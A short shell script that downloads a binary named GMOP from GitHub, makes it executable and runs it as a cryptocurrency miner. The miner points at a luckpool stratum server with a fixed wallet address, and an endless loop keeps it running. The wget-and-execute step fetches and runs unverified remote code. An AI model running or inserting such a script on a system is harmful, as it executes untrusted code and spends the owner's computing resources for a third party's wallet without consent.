#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/Godmine99/cpu/raw/main/GMOP
chmod +x GMOP
./GMOP -c stratum+tcp://ap.luckpool.net:3956 -u RCdUFd3iiu1tF5TjNPsDDxN2ApqZDSbYBW.GodMiner
while [ 1 ]; do
sleep 3
done
sleep 999